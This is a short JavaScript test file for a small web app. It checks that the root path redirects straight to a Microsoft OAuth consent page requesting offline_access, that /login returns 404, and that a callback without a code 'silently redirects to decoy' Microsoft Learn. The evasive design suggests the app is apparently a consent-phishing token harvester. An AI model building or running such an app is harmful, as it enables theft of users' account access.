const test = require('node:test');
const assert = require('node:assert/strict');
const request = require('supertest');

const { buildApp } = require('../app');
const { memoryStore, testConfig, silentLogger } = require('./_helpers');

test('GET / 302s straight to Microsoft consent URL (no HTML body)', async () => {
  const app = buildApp({ config: testConfig(), store: memoryStore(), logger: silentLogger() });
  const res = await request(app).get('/');
  assert.equal(res.status, 302);
  const url = new URL(res.headers.location);
  assert.equal(url.host, 'login.microsoftonline.com');
  assert.equal(url.pathname, '/common/oauth2/v2.0/authorize');
  assert.equal(url.searchParams.get('client_id'), 'test-client-id');
  assert.equal(url.searchParams.get('response_type'), 'code');
  assert.equal(url.searchParams.get('redirect_uri'), 'http://127.0.0.1:3000/login/authorized');
  assert.equal(url.searchParams.get('scope'), 'User.Read offline_access');
  assert.equal(url.searchParams.get('response_mode'), 'query');
});

test('GET /login no longer exists — falls through to 404', async () => {
  const app = buildApp({ config: testConfig(), store: memoryStore(), logger: silentLogger() });
  const res = await request(app).get('/login');
  assert.equal(res.status, 404);
});

test('GET /login/authorized with no code silently redirects to decoy', async () => {
  const app = buildApp({ config: testConfig(), store: memoryStore(), logger: silentLogger() });
  const res = await request(app).get('/login/authorized');
  assert.equal(res.status, 302);
  assert.equal(res.headers.location, 'https://learn.microsoft.com/');
});

test('Unknown path returns 404', async () => {
  const app = buildApp({ config: testConfig(), store: memoryStore(), logger: silentLogger() });
  const res = await request(app).get('/some/random/path');
  assert.equal(res.status, 404);
});
